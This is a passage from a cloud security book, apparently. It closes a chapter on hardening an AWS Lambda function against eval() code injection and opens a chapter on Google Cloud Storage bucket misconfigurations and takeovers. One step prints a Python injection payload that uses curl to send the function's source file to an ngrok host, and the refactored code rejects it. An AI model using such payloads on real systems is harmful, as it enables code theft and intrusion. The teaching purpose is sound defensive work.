
The updated Lambda function code rejected the malicious expression because it included unsupported AST nodes. Behind the scenes, the `_eval()` function (inside the `eval_expr()` function) raised a `TypeError`, which stopped the malicious expression from being evaluated.

### Note

The `eval_expr()` function supports only a limited set of AST nodes corresponding to safe arithmetic operations. Supported nodes include `ast.Num` and `ast.Constant` for numbers, `ast.BinOp` for binary operations (addition, subtraction, multiplication, division, modulus, exponentiation), and `ast.UnaryOp` for unary operations (negation). Any other node types are rejected to prevent code injection.

11. Check that you can exfiltrate the source code of the Lambda function with the following expression:

```
__import__('os').system('curl -X POST --data-binary @/var/task/lambda_function.py https://[GENERATED_ID].ngrok-free.app')
```

This returns the following output:

```
Invalid or unsafe expression
```

### Caution

The hands-on simulation in this chapter is intentionally simplified and does not cover or address every possible risk. Make sure to consider other potential vulnerabilities not covered in this book when securing real-world serverless applications.

At this point, you should have a good idea of how to secure Lambda functions against code injection vulnerabilities. Keep in mind that there are many ways to achieve this, and we have covered only one possible approach. As you explore how attackers exploit code injection vulnerabilities in serverless functions in the following chapters, you’ll learn different variations of these attacks and become better equipped to defend against them effectively.

### Caution

Now that you’ve completed the hands-on examples in this and the previous three chapters, make sure to review and delete all resources you created in your AWS accounts. Leaving resources that are no longer in use may lead to unnecessary charges and leave your account exposed to potential security risks.

# Summary

In this chapter, you configured the Lambda function with a VPC with restricted outbound access, and refactored the function code to eliminate the use of `eval()` to secure it against code injection attacks. Through the step-by-step simulations and detailed examples, you gained the knowledge and practical experience to recognize vulnerabilities and secure Lambda functions more effectively.

In the next chapter, you will shift your focus to Google Cloud and explore how attackers can exploit cloud storage bucket misconfigurations to expose or steal sensitive data. You will simulate scenarios such as dangling bucket takeovers and examine how lingering references to deleted buckets can be abused for malicious purposes. Finally, you will learn how to enforce secure bucket configurations by using IaC to minimize the risk of costly misconfigurations.

^[1](#ch07.html#id710-marker) An *internet gateway* is a VPC component that allows resources in the VPC to send and receive traffic to and from the internet. A *NAT gateway* is a VPC component that allows resources in private subnets to access the internet while preventing inbound traffic from reaching them directly.

^[2](#ch07.html#id716-marker) Your VPC will contain only one subnet.

^[3](#ch07.html#id723-marker) The function should generate the same set of log output as it did prior to being attached to the VPC.

^[4](#ch07.html#id724-marker) That is, you’ve successfully attached your function to your custom VPC.

^[5](#ch07.html#id728-marker) CORS headers are HTTP headers that enable browsers to access resources from a different origin. In API Gateway, configuring these headers allows your API to be called from client applications hosted on different domains or ports.

^[6](#ch07.html#id737-marker) I won’t go into the full details of Amazon API Gateway in this book. To learn more, check out the AWS re:Invent 2023 session [“I Didn’t Know Amazon API Gateway Did That (SVS323)”](https://oreil.ly/1__-g).

^[7](#ch07.html#id738-marker) To follow along, use [this Lambda function code](https://oreil.ly/2EtpN) from the `vulnerable-lambda-function-backend` GitHub repo.

^[8](#ch07.html#id739-marker) Although this configuration restricts access in browsers, clients can still invoke the API programmatically by using tools like `curl` or Postman.

^[9](#ch07.html#id746-marker) You should find two sets of these log messages, each corresponding to a separate request processed by the Lambda function. You may need to expand the log entry in CloudWatch Logs to view the full set of messages, especially if some lines are collapsed or truncated by default.

^[10](#ch07.html#id750-marker) To follow along, use [this Lambda function code](https://oreil.ly/1EMvm) from the `vulnerable-lambda-function-backend` GitHub repo.

^[11](#ch07.html#id751-marker) I used a generative AI tool to help refactor the original code and replace the insecure `eval()` function with a safer alternative implementation.

^[12](#ch07.html#id752-marker) For example, if the input string is `(40 - 2) * 5`, the function parses this expression into an abstract syntax tree where operations (like subtraction and multiplication) and operands (the numbers) become nodes. The evaluator function then safely computes the result by recursively processing each node and applying only the allowed arithmetic operations defined in the `operators` dictionary.

^[13](#ch07.html#id753-marker) You may consider setting up automated tests to ensure that safe expressions continue to be evaluated correctly, even after extensive code changes.

# Chapter 8. Hacking and Securing Google Cloud Storage Buckets

Since serverless functions and cloud resources that enable the serverless computing model are generally ephemeral in nature, serverless applications leverage cloud storage and database services to store data that must persist independently of short-lived compute resources. For example, a photo-sharing app might store uploaded photos, logs, and static assets in a Google Cloud Storage bucket, while user account data is stored separately in a dedicated database. Similarly, an ecommerce platform might store user documents, transaction receipts, and order invoices across multiple buckets. Imagine that you accidentally left a storage bucket containing uploaded passport scans exposed to the public! Since the bucket is publicly accessible, attackers could easily download those files and put the users of your application at risk of identity theft. This oversight can quickly escalate into a full-blown data breach with legal, financial, and reputational consequences.

Cloud storage misconfigurations account for a significant number of data breaches in the cloud. In this chapter, you’ll dive deeper into Cloud Storage bucket security misconfigurations and understand how attackers exploit them to gain unauthorized access to files and information. You’ll then simulate a dangling bucket takeover and explore how attackers can abuse lingering references to deleted buckets. Finally, you’ll learn how to enforce secure bucket configurations with IaC to minimize the risk of costly misconfigurations.

We will cover the following in this chapter:

*   [“Exploring Cloud Storage Bucket Security Misconfigurations”](#ch08.html#exploring_cloud_storage_bucket_security_misconfigurations_ch08-hacking-and-securing-misconfigured-google-cloud-storage-buckets_1762889437589)

*   [“Simulating a Dangling Bucket Takeover”](#ch08.html#simulating_a_dangling_bucket_takeover_ch08-hacking-and-securing-misconfigured-google-cloud-storage-buckets_1762889475088)

*   [“Enforcing Secure Bucket Configuration with Infrastructure as Code”](#ch08.html#enforcing_secure_bucket_configuration_with_infrastructure_as_code_ch08-hacking-and-securing-misconfigured-google-cloud-storage-buckets_1762889493739)
